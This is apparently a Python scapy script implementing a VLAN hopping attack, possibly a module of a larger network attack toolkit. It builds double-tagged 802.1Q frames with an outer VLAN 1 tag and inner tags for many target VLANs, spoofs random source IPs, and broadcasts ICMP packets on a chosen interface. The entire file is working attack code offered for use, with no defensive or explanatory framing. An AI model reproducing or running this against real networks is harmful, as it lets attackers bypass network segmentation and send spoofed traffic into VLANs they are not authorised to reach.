from scapy.all import Ether, Dot1Q, IP, ICMP, sendp
import argparse
import random

def execute(args):
    """Execute VLAN hopping attack"""
    print(f"[VLAN Hopping] Starting attack on interface {args.interface}")
    
    try:
        if args.vlans:
            vlans = [int(v) for v in args.vlans.split(",")]
        else:
            vlans = list(range(1, 100)) + [100, 200, 300, 400, 500, 1000, 2000]
        
        packets = generate_vlan_hopping_packets(
            vlans, 
            args.count if args.count else 100,
            args.target_ip if args.target_ip else "192.168.1.1"
        )
        
        sendp(packets, iface=args.interface, verbose=args.verbose)
        print(f"[VLAN Hopping] Sent {len(packets)} packets across {len(vlans)} VLANs")
        
        return True
        
    except Exception as e:
        print(f"[VLAN Hopping] Error: {e}")
        return False

def generate_vlan_hopping_packets(vlans, count_per_vlan, target_ip):
    """Generate VLAN hopping packets"""
    packets = []
    
    for vlan in vlans:
        for i in range(count_per_vlan):
            packet = (
                Ether(dst="ff:ff:ff:ff:ff:ff") /
                Dot1Q(vlan=1) / 
                Dot1Q(vlan=vlan) / 
                IP(dst=target_ip, src=f"192.168.{random.randint(1, 255)}.{random.randint(1, 254)}") /
                ICMP() /
                b"VLAN_HOPPING_ATTACK_PAYLOAD"
            )
            packets.append(packet)
    
    return packets

def add_arguments(parser):
    """Add VLAN hopping specific arguments to parser"""
    parser.add_argument("--vlans", help="Comma-separated list of VLAN IDs to target")
    parser.add_argument("--count", "-c", type=int, default=100, 
                       help="Number of packets per VLAN (default: 100)")
    parser.add_argument("--target-ip", "-ti", help="Target IP address within VLANs")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="VLAN Hopping Attack")
    parser.add_argument("--interface", "-i", required=True, help="Network interface")
    parser.add_argument("--vlans", help="Comma-separated list of VLAN IDs to target")
    parser.add_argument("--count", "-c", type=int, default=100, 
                       help="Number of packets per VLAN")
    parser.add_argument("--target-ip", "-ti", help="Target IP address within VLANs")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    execute(args)